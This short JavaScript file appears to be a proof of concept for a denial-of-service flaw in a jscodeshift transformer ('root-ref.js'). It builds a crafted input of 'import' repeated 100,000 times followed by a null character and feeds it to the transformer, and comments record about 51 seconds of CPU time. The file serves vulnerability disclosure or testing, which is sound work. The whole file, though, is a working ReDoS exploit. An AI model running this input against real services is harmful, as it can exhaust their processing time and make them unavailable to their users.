import transformer from "./root-ref.js";

//Attack String :""+"import"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "import";
}
str += "\u0000";

const file = {
  source: str,
};

var result = transformer(file);

// real    0m51.027s
// user    0m50.980s
// sys     0m0.010s

//原意需传入的file类型: import("jscodeshift").FileInfo;